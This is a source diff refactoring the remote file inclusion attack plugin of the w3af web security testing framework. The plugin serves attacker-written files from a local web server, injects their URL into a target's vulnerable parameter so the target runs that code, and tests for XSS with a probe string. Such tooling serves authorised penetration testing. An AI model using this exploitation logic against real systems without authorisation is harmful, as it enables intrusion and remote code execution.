@@ -20,6 +20,7 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
 import os
+import socket
 
 import core.controllers.output_manager as om
 import core.data.kb.knowledge_base as kb
@@ -54,7 +55,6 @@ class rfi(AttackPlugin):
         AttackPlugin.__init__(self)
 
         # Internal variables
-        self._shell = None
         self._xss_vuln = None
         self._exploit_dc = None
 
@@ -62,18 +62,6 @@ class rfi(AttackPlugin):
         self._listen_port = ports.RFI_SHELL
         self._listen_address = get_local_ip()
         self._use_XSS_vuln = True
-        self._generate_only_one = True
-
-    def fast_exploit(self, url, method, data):
-        '''
-        Exploits a web app with remote file include vuln.
-
-        @param url: A string containing the Url to exploit ( http://somehost.com/foo.php )
-        @param method: A string containing the method to send the data ( post / get )
-        @param data: A string containing data to send with a mark that defines
-        which is the vulnerable parameter ( aa=notMe&bb=almost&cc=[VULNERABLE] )
-        '''
-        return self._shell
 
     def can_exploit(self, vuln_to_exploit=None):
         '''
@@ -85,9 +73,11 @@ class rfi(AttackPlugin):
         @return: True if plugin knows how to exploit a found vuln.
         '''
         if not self._listen_address and not self._use_XSS_vuln:
-            msg = 'You need to specify a local IP address where w3af can bind an HTTP server'
-            msg += ' that can be reached by the vulnerable Web application.'
-            raise w3afException(msg)
+            msg = 'You need to specify a local IP address where w3af can bind'\
+                  ' an HTTP server that can be reached by the vulnerable Web'\
+                  ' application.'
+            om.out.error(msg)
+            return False
 
         rfi_vulns = kb.kb.get('rfi', 'rfi')
         if vuln_to_exploit is not None:
@@ -95,61 +85,84 @@ class rfi(AttackPlugin):
 
         if not rfi_vulns:
             return False
-        else:
 
-            #
-            #    Ok, I have the RFI vulnerability to exploit, but... is the
-            #    plugin configured in such a way that exploitation is possible?
-            #
-            if self._use_XSS_vuln:
+        #
+        # Ok, I have the RFI vulnerability to exploit, but... is the
+        # plugin configured in such a way that exploitation is possible?
+        #
+        if self._use_XSS_vuln:
+            usable_xss = self._verify_xss_vuln()
 
-                xss_vulns = kb.kb.get('xss', 'xss')
+        # Using the good old webserver (if properly configured)
+        if not self._listen_address and not usable_xss:
+            msg = 'You need to specify a local IP address where w3af can'\
+                  ' bind an HTTP server that can be reached by the'\
+                  ' vulnerable Web application.'
+            om.out.error(msg)
+            return False
+        
+        if self._listen_address and self._listen_port:
+            # Start local webserver, raise an exception if something
+            # fails
+            webroot_path = os.path.join(get_home_dir(), 'webroot')
+            try:
+                webserver.start_webserver(self._listen_address, self._listen_port,
+                                          webroot_path)
+            except socket.error, se:
+                msg = 'Failed to start the local web server to exploit the'\
+                      ' RFI vulnerability, the exception was: "%s".'
+                om.out.error(msg % se)
+                return False
+            
+        return True
 
-                if not xss_vulns:
-                    msg = 'rfi plugin is configured to use a XSS bug to'
-                    msg += ' exploit the RFI bug, but no XSS was found.'
-                    om.out.console(msg)
+    def _verify_xss_vuln(self):
+        '''
+        @return: True if we can use the XSS vulnerabilities in the KB to
+                 exploit the RFI vulnerability.
+        '''
+        xss_vulns = kb.kb.get('xss', 'xss')
 
-                else:
-                    #
-                    #    I have some XSS vulns, lets see if they have what we need
-                    #
+        if not xss_vulns:
+            msg = 'rfi plugin is configured to use a XSS bug to'\
+                  ' exploit the RFI bug, but no XSS was found. The exploit'\
+                  ' will use a local web server.'
+            om.out.console(msg)
 
-                    for xss_vuln in xss_vulns:
-                        # Set the test string
-                        test_string = '<?#@!()&=?>'
+        #
+        #    I have some XSS vulns, lets see if they have what we need
+        #
 
-                        # Test if the current xss vuln works for us:
-                        function_reference = getattr(
-                            self._uri_opener, xss_vuln.get_method())
-                        data_container = xss_vuln.get_dc()
-                        data_container[xss_vuln.get_var()] = test_string
+        for xss_vuln in xss_vulns:
+            # Set the test string
+            test_string = '<?#@!()&=?>'
 
-                        try:
-                            http_res = function_reference(
-                                xss_vuln.get_url(), str(data_container))
-                        except:
-                            continue
-                        else:
-                            if test_string in http_res.get_body():
-                                self._xss_vuln = xss_vuln
-                                return True
+            # Test if the current xss vuln works for us:
+            function_reference = getattr(
+                self._uri_opener, xss_vuln.get_method())
+            data_container = xss_vuln.get_dc()
+            data_container[xss_vuln.get_var()] = test_string
 
-                    # Check If I really got something nice that I can use to exploit
-                    # if not, report it to the user
-                    if not self._xss_vuln:
-                        msg = 'rfi plugin is configured to use a XSS'
-                        msg += ' vulnerability to exploit the RFI, but no XSS with the required'
-                        msg += ' capabilities was found.'
-                        om.out.console(msg)
+            try:
+                http_res = function_reference(
+                    xss_vuln.get_url(), str(data_container))
+            except:
+                continue
+            else:
+                if test_string in http_res.get_body():
+                    self._xss_vuln = xss_vuln
+                    return True
 
-            #    Using the good old webserver (if properly configured)
-            if not self._listen_address:
-                msg = 'You need to specify a local IP address where w3af can bind an HTTP server'
-                msg += ' that can be reached by the vulnerable Web application.'
-                raise w3afException(msg)
-
-            return True
+        # Check If I really got something nice that I can use to exploit
+        # if not, report it to the user
+        if not self._xss_vuln:
+            msg = 'rfi plugin is configured to use a XSS vulnerability'\
+                  ' to exploit the RFI, but no XSS with the required'\
+                  ' capabilities was found. The exploit will use a local'\
+                  ' web server.'
+            om.out.console(msg)
+        
+        return False
 
     def get_attack_type(self):
         '''
@@ -201,7 +214,6 @@ class rfi(AttackPlugin):
 
         @return : True if vuln can be exploited.
         '''
-        # Create the shell
         extension = vuln.get_url().get_extension()
 
         # I get a list of tuples with file_content and extension to use
@@ -217,19 +229,14 @@ class rfi(AttackPlugin):
 
             url_to_include = self._gen_url_to_include(file_content, extension)
 
-            # Start local webserver
-            webroot_path = os.path.join(get_home_dir(), 'webroot')
-            webserver.start_webserver(self._listen_address, self._listen_port,
-                                      webroot_path)
-
             # Prepare for exploitation...
             function_reference = getattr(self._uri_opener, vuln.get_method())
             data_container = vuln.get_dc()
             data_container[vuln.get_var()] = url_to_include
 
             try:
-                http_res = function_reference(
-                    vuln.get_url(), str(data_container))
+                http_res = function_reference(vuln.get_url(),
+                                              str(data_container))
             except:
                 continue
             else:
@@ -243,8 +250,9 @@ class rfi(AttackPlugin):
         else:
 
             #
-            #    We get here when it was impossible to create a RFI shell, but we
-            #    still might be able to do some interesting stuff
+            #  We get here when it was impossible to create a RFI shell, but we
+            #  still might be able to do some interesting stuff through error
+            #  messages shown by the web application  
             #
             function_reference = getattr(self._uri_opener, vuln.get_method())
             data_container = vuln.get_dc()
@@ -281,23 +289,24 @@ class rfi(AttackPlugin):
         else:
             # Write the php to the webroot
             filename = rand_alnum()
+            filepath = os.path.join(get_home_dir(), 'webroot', filename)
             try:
-                file_handler = open(
-                    os.path.join(get_home_dir(), 'webroot', filename), 'w')
+                file_handler = open(filepath, 'w')
                 file_handler.write(file_content)
                 file_handler.close()
             except:
                 raise w3afException('Could not create file in webroot.')
             else:
-                url_to_include = 'http://' + self._listen_address + ':'
-                url_to_include += str(self._listen_port) + '/' + filename
+                url_to_include = 'http://%s:%s/%s' % (self._listen_address,
+                                                      self._listen_port,
+                                                      filename)
                 return url_to_include
 
     def _rm_file(self, url_to_include):
         '''
         Remove the file in the webroot.
 
-        PLEASE NOTE: This is duplicated code!! see the same note above.
+        PLEASE NOTE: This is duplicated code!! see the same note below.
         '''
         if not self._use_XSS_vuln:
             # Remove the file
@@ -308,51 +317,40 @@ class rfi(AttackPlugin):
         '''
         @return: A list of option objects for this plugin.
         '''
-        d1 = 'IP address that the webserver will use to receive requests'
-        h1 = 'w3af runs a webserver to serve the files to the target web app'
-        h1 += ' when doing remote file inclusions. This setting configures on what IP address the'
-        h1 += ' webserver is going to listen.'
-        o1 = opt_factory(
-            'listen_address', self._listen_address, d1, 'string', help=h1)
-
-        d2 = 'Port that the webserver will use to receive requests'
-        h2 = 'w3af runs a webserver to serve the files to the target web app'
-        h2 += ' when doing remote file inclusions. This setting configures on what IP address'
-        h2 += ' the webserver is going to listen.'
-        o2 = opt_factory(
-            'listen_port', self._listen_port, d2, 'integer', help=h2)
-
-        d3 = 'Instead of including a file in a local webserver; include the result of'
-        d3 += ' exploiting a XSS bug.'
-        o3 = opt_factory('useXssBug', self._use_XSS_vuln, d3, 'boolean')
-
-        d4 = 'If true, this plugin will try to generate only one shell object.'
-        o4 = opt_factory(
-            'generateOnlyOne', self._generate_only_one, d4, 'boolean')
-
         ol = OptionList()
-        ol.add(o1)
-        ol.add(o2)
-        ol.add(o3)
-        ol.add(o4)
+        
+        d = 'IP address that the webserver will use to receive requests'
+        h = 'w3af runs a webserver to serve the files to the target web app'\
+            ' when doing remote file inclusions. This setting configures on'\
+            ' what IP address the webserver is going to listen.'
+        o = opt_factory('listen_address', self._listen_address, d, 'ip', help=h)
+        ol.add(o)
+        
+        d = 'Port that the webserver will use to receive requests'
+        h = 'w3af runs a webserver to serve the files to the target web app'\
+            ' when doing remote file inclusions. This setting configures on'\
+            ' what IP address the webserver is going to listen.'
+        o = opt_factory('listen_port', self._listen_port, d, 'port', help=h)
+        ol.add(o)
+        
+        d = 'Instead of including a file in a local webserver; include the '\
+            ' result of exploiting a XSS bug within the same target site.'
+        o = opt_factory('use_xss_bug', self._use_XSS_vuln, d, 'boolean')
+        ol.add(o)
+        
         return ol
 
     def set_options(self, options_list):
         '''
-        This method sets all the options that are configured using the user interface
-        generated by the framework using the result of get_options().
+        This method sets all the options that are configured using the user
+        interface generated by the framework using the result of get_options().
 
         @param options_list: A map with the options for the plugin.
         @return: No value is returned.
         '''
         self._listen_address = options_list['listen_address'].get_value()
         self._listen_port = options_list['listen_port'].get_value()
-        self._use_XSS_vuln = options_list['useXssBug'].get_value()
-        self._generate_only_one = options_list['generateOnlyOne'].get_value()
-
-        if self._listen_address == '' and not self._use_XSS_vuln:
-            om.out.error('rfi plugin has to be correctly configured to use.')
-            return False
+        self._use_XSS_vuln = options_list['use_xss_bug'].get_value()
 
     def get_root_probability(self):
         return 0.8
@@ -373,8 +371,7 @@ class rfi(AttackPlugin):
         Four configurable parameters exist:
             - listen_address
             - listen_port
-            - useXssBug
-            - generateOnlyOne
+            - use_xss_bug
         '''
 
 
@@ -493,7 +490,7 @@ class RFIShell(ExecShell, PortScanShell):
 
     def _rm_file(self, url_to_include):
         '''
-        Remove the file in the webroot.
+        Remove the file from the webroot.
 
         PLEASE NOTE: This is duplicated code!! see the same note above.
         '''
